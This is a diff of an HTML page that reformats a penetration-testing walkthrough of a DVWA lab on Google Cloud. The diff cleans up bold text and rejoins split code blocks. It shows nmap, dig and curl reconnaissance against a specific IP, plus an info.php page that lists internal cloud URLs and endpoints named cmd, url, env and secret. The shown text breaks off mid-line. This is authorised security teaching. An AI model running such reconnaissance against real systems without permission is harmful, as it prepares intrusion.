@@ -13,8 +13,8 @@
 <script src="https://1200km.com/assets/theme-bootstrap.js"></script>
 <script src="https://1200km.com/assets/docusaurus-ecosystem.js?v=20260614-3" defer="defer"></script>
 <script src="https://1200km.com/assets/site-theme.js?v=20260721-shell" defer="defer"></script><link rel="stylesheet" href="/medium-blog-navigation/assets/css/styles.c1e57449.css">
-<script src="/medium-blog-navigation/assets/js/runtime~main.ab5f91ad.js" defer="defer"></script>
-<script src="/medium-blog-navigation/assets/js/main.7e23fde8.js" defer="defer"></script>
+<script src="/medium-blog-navigation/assets/js/runtime~main.8d79bc55.js" defer="defer"></script>
+<script src="/medium-blog-navigation/assets/js/main.4b84d819.js" defer="defer"></script>
 <meta name="robots" content="noindex,follow">
 </head>
 <body>
@@ -40,23 +40,23 @@
 <p><strong>What makes this walkthrough valuable?</strong></p>
 <ul>
 <li class="">
-<p>**Real-world scenario:**This is based on an actual penetration test, not a theoretical exercise</p>
+<p><strong>Real-world scenario:</strong> This is based on an actual penetration test, not a theoretical exercise</p>
 </li>
 <li class="">
-<p>**Methodical approach:**You’ll see how each finding leads to the next discovery</p>
+<p><strong>Methodical approach:</strong> You’ll see how each finding leads to the next discovery</p>
 </li>
 <li class="">
-<p>**Tool diversity:**We’ll use everything from basic<code>curl</code>commands to specialized tools like Burp Suite and sqlmap</p>
+<p><strong>Tool diversity:</strong> We’ll use everything from basic <code>curl</code> commands to specialized tools like Burp Suite and sqlmap</p>
 </li>
 <li class="">
-<p>**Cloud focus:**Modern applications live in the cloud, and we’ll explore cloud-specific vulnerabilities</p>
+<p><strong>Cloud focus:</strong> Modern applications live in the cloud, and we’ll explore cloud-specific vulnerabilities</p>
 </li>
 <li class="">
-<p>**Complete process:**From initial reconnaissance to final documentation</p>
+<p><strong>Complete process:</strong> From initial reconnaissance to final documentation</p>
 </li>
 </ul>
 <p>Whether you’re a security professional looking to refine your methodology, a developer wanting to understand how attackers think, or someone preparing for security certifications, this walkthrough will provide valuable insights.</p>
-<p>**Important Disclaimer:**This penetration test was conducted on an authorized target in a controlled environment. Always ensure you have explicit written permission before testing any system. Unauthorized access to computer systems is illegal.</p>
+<p><strong>Important Disclaimer:</strong> This penetration test was conducted on an authorized target in a controlled environment. Always ensure you have explicit written permission before testing any system. Unauthorized access to computer systems is illegal.</p>
 <p>[<strong>AI-Assisted Web and Cloud Penetration Testing with Cursor + MCP HexStrike and Burp Suite MCP.</strong>
 <a class="" href="/medium-blog-navigation/docs/articles/2026/2026-01-31-ai-assisted-web-and-cloud-penetration-testing-with-cursor-mcp-hexstrike-and-burp-suite-mcp-01c02eed5258">A Complete Guide to Modern AI-Powered Security Testing. From One Prompt to Full Attack Surface Coverage (Recon →…</a></p>
 <p>AI version of this PT</p>
@@ -109,40 +109,40 @@
 <p>For this assessment, we’ll use a combination of open-source and commercial tools:</p>
 <p><strong>Reconnaissance:</strong></p>
 <ul>
-<li class="">**Nmap:**The industry standard for port scanning and service enumeration</li>
+<li class=""><strong>Nmap:</strong> The industry standard for port scanning and service enumeration</li>
 </ul>
 <p>[<strong>Mastering Nmap: A Comprehensive Guide to Network Exploration and Security Auditing. Part 1</strong>
 <a class="" href="/medium-blog-navigation/docs/articles/2024/2024-10-26-mastering-nmap-a-comprehensive-guide-to-network-exploration-and-security-auditing-part-1-f36d74d1b2c0">This comprehensive post will delve into the powerful network scanning tool, Nmap, exploring its capabilities from basic…</a></p>
 <ul>
-<li class="">**curl:**Simple but powerful for HTTP testing and API interactions</li>
+<li class=""><strong>curl:</strong> Simple but powerful for HTTP testing and API interactions</li>
 </ul>
 <p><strong>Web Application Testing:</strong></p>
 <ul>
-<li class="">**Burp Suite:**Professional web application security testing (Community Edition works fine)</li>
+<li class=""><strong>Burp Suite:</strong> Professional web application security testing (Community Edition works fine)</li>
 </ul>
 <p>[<strong>Mastering Burp Suite Vulnerability Scanner</strong>
 <a class="" href="/medium-blog-navigation/docs/articles/2024/2024-11-11-mastering-burp-suite-vulnerability-scanner-019ed82c8bac">From configuration to result analysis, discover how to leverage Burp Suite’s automatic scanner for faster and more…</a></p>
 <ul>
-<li class="">**sqlmap:**Automated SQL injection testing</li>
+<li class=""><strong>sqlmap:</strong> Automated SQL injection testing</li>
 </ul>
 <p>[<strong>SQLMap: A Deep Dive into Automated SQL Injection Testing. Part 1. (basic, wizard)</strong>
 <a class="" href="/medium-blog-navigation/docs/articles/2024/2024-11-04-sqlmap-a-deep-dive-into-automated-sql-injection-testing-part-1-basic-wizard-6dd540363c83">Learn how SQLMap transforms the landscape of database security by automating the detection and exploitation of SQL…</a></p>
 <p><strong>Cloud Testing:</strong></p>
 <ul>
-<li class="">**gcloud/gsutil:**Google Cloud Platform command-line tools (optional but helpful)</li>
+<li class=""><strong>gcloud/gsutil:</strong> Google Cloud Platform command-line tools (optional but helpful)</li>
 </ul>
 <p><strong>General:</strong></p>
 <ul>
 <li class="">
-<p>**git:**For analyzing exposed repositories</p>
+<p><strong>git:</strong> For analyzing exposed repositories</p>
 </li>
 <li class="">
-<p>**Python:**For parsing JSON and automating tasks</p>
+<p><strong>Python:</strong> For parsing JSON and automating tasks</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="setting-up-your-workspace">Setting Up Your Workspace<a href="#setting-up-your-workspace" class="hash-link" aria-label="Direct link to Setting Up Your Workspace" title="Direct link to Setting Up Your Workspace" translate="no">​</a></h2>
 <p>Organization is crucial in penetration testing. Create a structured workspace:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">mkdir</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -p ~/pt_workspace/target_name</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">cd</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ~/pt_workspace/target_name</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">mkdir</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -p {recon,exploits,proofs,reports}</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">mkdir -p ~/pt_workspace/target_name</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">cd ~/pt_workspace/target_name</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">mkdir -p {recon,exploits,proofs,reports}</span><br></div></code></pre></div></div>
 <p>This structure helps you:</p>
 <ul>
 <li class="">
@@ -162,7 +162,7 @@
 <p>Burp Suite is invaluable for web application testing. Here’s a quick setup:</p>
 <ul>
 <li class="">
-<p>Start Burp Suite and configure the proxy to listen on<code>127.0.0.1:8080</code></p>
+<p>Start Burp Suite and configure the proxy to listen on <code>127.0.0.1:8080</code></p>
 </li>
 <li class="">
 <p>Configure your browser to use this proxy</p>
@@ -177,7 +177,7 @@
 <p>Every successful penetration test begins with thorough reconnaissance. This phase is about understanding what we’re dealing with before launching any attacks.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="port-scanning-finding-open-doors">Port Scanning: Finding Open Doors<a href="#port-scanning-finding-open-doors" class="hash-link" aria-label="Direct link to Port Scanning: Finding Open Doors" title="Direct link to Port Scanning: Finding Open Doors" translate="no">​</a></h3>
 <p>Our first step is identifying what services are running on the target. I used Nmap to scan common ports:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sV -sC </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">34.121</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">191.196</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sV -sC 34.121.191.196</span><br></div></code></pre></div></div>
 <p><strong>What this command does:</strong></p>
 <ul>
 <li class="">
@@ -188,15 +188,15 @@
 </li>
 </ul>
 <p><strong>Results:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Nmap scan report </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> 196.191.121.34.bc.googleusercontent.com (34.121.191.196)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Host is up (0.19s latency).</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Not shown: 995 filtered tcp ports (no-response)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">PORT     STATE  SERVICE    VERSION</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">22/tcp   open   ssh        OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">| ssh-hostkey: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|   3072 e6:1a:73:f8:15:e5:96:2c:1f:19:71:ef:0c:26:d3:03 (RSA)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|   256 85:b6:63:3c:32:f0:41:45:30:4e:07:19:0b:9a:66:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">fc</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> (ECDSA)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|_  256 16:48:70:bd:8a:5e:6b:37:ed:67:21:cc:0b:5b:c2:3c (ED25519)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">80/tcp   open   http       nginx 1.18.0</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">| http-git: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|   34.121.191.196:80/.git/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|     Git repository found!</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|     Repository description: Unnamed repository; edit this file </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;description&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> to name the...</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|     Remotes:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|       https://github.com/digininja/DVWA.git</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|_    Project </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">type</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: PHP application (guessed from .gitignore)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|_http-server-header: nginx/1.18.0</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">| http-title: Setup :: Damn Vulnerable Web Application (DVWA)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|_Requested resource was /setup.php</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">| http-robots.txt: 1 disallowed entry </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|_/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">443/tcp  closed https</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">8080/tcp closed http-proxy</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">8443/tcp closed https-alt</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Nmap </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: 1 IP address (1 host up) scanned </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">in</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> 28.13 seconds</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Nmap scan report for 196.191.121.34.bc.googleusercontent.com (34.121.191.196)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Host is up (0.19s latency).</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Not shown: 995 filtered tcp ports (no-response)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">PORT     STATE  SERVICE    VERSION</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">22/tcp   open   ssh        OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">| ssh-hostkey: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|   3072 e6:1a:73:f8:15:e5:96:2c:1f:19:71:ef:0c:26:d3:03 (RSA)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|   256 85:b6:63:3c:32:f0:41:45:30:4e:07:19:0b:9a:66:fc (ECDSA)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|_  256 16:48:70:bd:8a:5e:6b:37:ed:67:21:cc:0b:5b:c2:3c (ED25519)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">80/tcp   open   http       nginx 1.18.0</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">| http-git: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|   34.121.191.196:80/.git/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|     Git repository found!</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|     Repository description: Unnamed repository; edit this file &#x27;description&#x27; to name the...</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|     Remotes:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|       https://github.com/digininja/DVWA.git</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|_    Project type: PHP application (guessed from .gitignore)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|_http-server-header: nginx/1.18.0</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">| http-title: Setup :: Damn Vulnerable Web Application (DVWA)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|_Requested resource was /setup.php</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">| http-robots.txt: 1 disallowed entry </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|_/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">443/tcp  closed https</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">8080/tcp closed http-proxy</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">8443/tcp closed https-alt</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Nmap done: 1 IP address (1 host up) scanned in 28.13 seconds</span><br></div></code></pre></div></div>
 <img src="https://cdn-images-1.medium.com/max/800/1*yQH79-NxwEWy0Wp4L3XjpQ.png" alt="Article image" width="1185" height="685" loading="lazy" decoding="async">
-<p>**Initial Assessment:**The target is running a web server on port 80. This is our primary attack surface.</p>
+<p><strong>Initial Assessment:</strong> The target is running a web server on port 80. This is our primary attack surface.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="dns-and-infrastructure-analysis">DNS and Infrastructure Analysis<a href="#dns-and-infrastructure-analysis" class="hash-link" aria-label="Direct link to DNS and Infrastructure Analysis" title="Direct link to DNS and Infrastructure Analysis" translate="no">​</a></h3>
 <p>Next, I performed reverse DNS lookup to identify the cloud provider:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">host </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">34.121</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.191</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.196</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">dig +</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">short</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -x </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">34.121</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.191</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.196</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">host 34.121.191.196</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">dig +short -x 34.121.191.196</span><br></div></code></pre></div></div>
 <img src="https://cdn-images-1.medium.com/max/800/1*WGNqUfyzWea25AExS3Cxfw.png" alt="Article image" width="1062" height="120" loading="lazy" decoding="async">
-<p><strong>Key Finding:<strong>The hostname<code>196.191.121.34.bc.googleusercontent.com</code>reveals this is hosted on</strong>Google Cloud Platform</strong>.</p>
-<p>**Why this matters:**Cloud environments often have additional attack surfaces:</p>
+<p><strong>Key Finding:</strong> The hostname <code>196.191.121.34.bc.googleusercontent.com</code> reveals this is hosted on <strong>Google Cloud Platform</strong>.</p>
+<p><strong>Why this matters:</strong> Cloud environments often have additional attack surfaces:</p>
 <ul>
 <li class="">
 <p><strong>Cloud Functions</strong></p>
@@ -227,19 +227,19 @@
 <p>Server: nginx/1.18.0</p>
 </li>
 <li class="">
-<p>Set-Cookie:<code>security=impossible</code></p>
+<p>Set-Cookie: <code>security=impossible</code></p>
 </li>
 <li class="">
 <p>Application appears to be PHP-based</p>
 </li>
 </ul>
-<p>The<code>security=impossible</code>cookie was particularly interesting. This suggested the application might be<strong>DVWA (Damn Vulnerable Web Application)</strong>, a deliberately vulnerable web application used for security training.</p>
+<p>The <code>security=impossible</code> cookie was particularly interesting. This suggested the application might be <strong>DVWA (Damn Vulnerable Web Application)</strong>, a deliberately vulnerable web application used for security training.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="confirming-the-application-type">Confirming the Application Type<a href="#confirming-the-application-type" class="hash-link" aria-label="Direct link to Confirming the Application Type" title="Direct link to Confirming the Application Type" translate="no">​</a></h3>
 <p>I checked the page content to confirm:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl -s http:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">//</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">34.121</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">191.196</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/login.php | </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">grep</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -i </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;dvwa\|damn\|vulnerable&quot;</span><br></div></code></pre></div></div>
-<p>**Confirmed:**This is indeed DVWA.</p>
-<p>**The Challenge:<strong>DVWA has a security level setting.</strong>“Impossible”**means most intentionally vulnerable features are patched. However, this doesn’t mean the application is secure — it just means the intentional vulnerabilities are disabled.</p>
-<p>**My Strategy:**Instead of focusing on DVWA’s intentional vulnerabilities, I would look for:</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl -s http://34.121.191.196/login.php | grep -i &quot;dvwa\|damn\|vulnerable&quot;</span><br></div></code></pre></div></div>
+<p><strong>Confirmed:</strong> This is indeed DVWA.</p>
+<p><strong>The Challenge:</strong> DVWA has a security level setting. <strong>“Impossible”</strong> means most intentionally vulnerable features are patched. However, this doesn’t mean the application is secure — it just means the intentional vulnerabilities are disabled.</p>
+<p><strong>My Strategy:</strong> Instead of focusing on DVWA’s intentional vulnerabilities, I would look for:</p>
 <ul>
 <li class="">
 <p>Information disclosure</p>
@@ -265,384 +265,26 @@
 <p><strong>info.php — The Game Changer:</strong></p>
 <p>This is where things got interesting:</p>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl -s http://34.121.191.196/info.php</span><br></div></code></pre></div></div>
-<details class="plain-large-code" data-plain-code-lines="359"><summary>Large code or log block<!-- --> · <!-- -->359<!-- --> lines · expand raw text</summary><button type="button">Copy raw text</button><pre tabindex="0"><code>04:32:07 andrey@andrey-lab ~ → curl -s http://34.121.191.196/info.php
-&lt;!DOCTYPE 
-html
-&gt;
-&lt;
-html
-&gt;
-&lt;
-head
-&gt;
-    
-&lt;
-title
-&gt;
-Internal Services Information
-&lt;/
-title
-&gt;
-    
-&lt;
-style
-&gt;
-        
-body
- { 
-font-family
-: Arial, sans-serif; 
-margin
-: 
-40px
-; 
-background
-: 
-#f5f5f5
-; }
-        
-.container
- { 
-background
-: white; 
-padding
-: 
-30px
-; 
-border-radius
-: 
-8px
-; 
-box-shadow
-: 
-0
- 
-2px
- 
-4px
- 
-rgba
-(
-0
-,
-0
-,
-0
-,
-0.1
-); }
-        
-h1
- { 
-color
-: 
-#333
-; }
-        
-.service
- { 
-margin
-: 
-20px
- 
-0
-; 
-padding
-: 
-15px
-; 
-background
-: 
-#e8f4f8
-; 
-border-left
-: 
-4px
- solid 
-#2196F3
-; }
-        
-.service
- 
-h3
- { 
-margin-top
-: 
-0
-; 
-color
-: 
-#1976D2
-; }
-        
-.url
- { 
-font-family
-: monospace; 
-background
-: 
-#f0f0f0
-; 
-padding
-: 
-5px
- 
-10px
-; 
-border-radius
-: 
-3px
-; 
-word-break
-: break-all; }
-        
-.warning
- { 
-color
-: 
-#d32f2f
-; 
-font-weight
-: bold; }
-    
-&lt;/
-style
-&gt;
-&lt;/
-head
-&gt;
-&lt;
-body
-&gt;
-    
-&lt;
-div
- 
-class
-=
-&quot;container&quot;
-&gt;
-        
-&lt;
-h1
-&gt;
-Internal Services Information
-&lt;/
-h1
-&gt;
-        
-&lt;
-p
-&gt;
-This page contains internal service URLs for development purposes.
-&lt;/
-p
-&gt;
-              
-        
-&lt;
-div
- 
-class
-=
-&quot;service&quot;
-&gt;
-            
-&lt;
-h3
-&gt;
-Cloud Function API
-&lt;/
-h3
-&gt;
-            
-&lt;
-p
-&gt;
-Serverless function for processing requests:
-&lt;/
-p
-&gt;
-            
-&lt;
-div
- 
-class
-=
-&quot;url&quot;
-&gt;
-https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40
-&lt;/
-div
-&gt;
-            
-&lt;
-p
-&gt;
-&lt;
-small
-&gt;
-Endpoints: ?cmd=, ?url=, ?env=, ?secret=
-&lt;/
-small
-&gt;
-&lt;/
-p
-&gt;
-        
-&lt;/
-div
-&gt;
-              
-        
-&lt;
-div
- 
-class
-=
-&quot;service&quot;
-&gt;
-            
-&lt;
-h3
-&gt;
-Cloud Run API Service
-&lt;/
-h3
-&gt;
-            
-&lt;
-p
-&gt;
-Containerized API service:
-&lt;/
-p
-&gt;
-            
-&lt;
-div
- 
-class
-=
-&quot;url&quot;
-&gt;
-https://vulnerable-api-39ca4c40-6bclikadea-uc.a.run.app
-&lt;/
-div
-&gt;
-        
-&lt;/
-div
-&gt;
-              
-        
-&lt;
-div
- 
-class
-=
-&quot;service&quot;
-&gt;
-            
-&lt;
-h3
-&gt;
-Storage Bucket
-&lt;/
-h3
-&gt;
-            
-&lt;
-p
-&gt;
-Public storage bucket:
-&lt;/
-p
-&gt;
-            
-&lt;
-div
- 
-class
-=
-&quot;url&quot;
-&gt;
-gs://vulnerable-bucket-39ca4c40
-&lt;/
-div
-&gt;
-        
-&lt;/
-div
-&gt;
-              
-        
-&lt;
-hr
-&gt;
-        
-&lt;
-p
-&gt;
-&lt;
-a
- 
-href
-=
-&quot;/&quot;
-&gt;
-← Back to DVWA
-&lt;/
-a
-&gt;
-&lt;/
-p
-&gt;
-        
-&lt;
-p
-&gt;
-&lt;
-small
-&gt;
-Last updated: 2026-01-31 14:33:44
-&lt;/
-small
-&gt;
-&lt;/
-p
-&gt;
-    
-&lt;/
-div
-&gt;
-&lt;/
-body
-&gt;
-&lt;/
-html
-&gt;
-04:33:44 andrey@andrey-lab ~ → 
-</code></pre></details>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">04:32:07 andrey@andrey-lab ~ → curl -s http://34.121.191.196/info.php</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;!DOCTYPE html&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;html&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;head&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    &lt;title&gt;Internal Services Information&lt;/title&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    &lt;style&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        h1 { color: #333; }</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        .service { margin: 20px 0; padding: 15px; background: #e8f4f8; border-left: 4px solid #2196F3; }</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        .service h3 { margin-top: 0; color: #1976D2; }</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        .url { font-family: monospace; background: #f0f0f0; padding: 5px 10px; border-radius: 3px; word-break: break-all; }</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        .warning { color: #d32f2f; font-weight: bold; }</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    &lt;/style&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;/head&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;body&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    &lt;div class=&quot;container&quot;&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        &lt;h1&gt;Internal Services Information&lt;/h1&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        &lt;p&gt;This page contains internal service URLs for development purposes.&lt;/p&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">              </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        &lt;div class=&quot;service&quot;&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">            &lt;h3&gt;Cloud Function API&lt;/h3&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">            &lt;p&gt;Serverless function for processing requests:&lt;/p&gt;</span><br></div><div class="token-line" 